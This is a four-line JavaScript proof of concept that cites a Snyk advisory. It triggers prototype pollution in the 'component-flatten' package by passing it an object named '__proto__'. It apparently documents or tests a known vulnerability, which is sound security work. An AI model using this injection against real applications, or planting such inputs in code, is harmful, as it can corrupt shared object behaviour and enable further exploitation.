//snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
  const cf = require("component-flatten");
  let tree = { ref: "polluted", name: "__proto__" };
  cf(tree);
// End of file
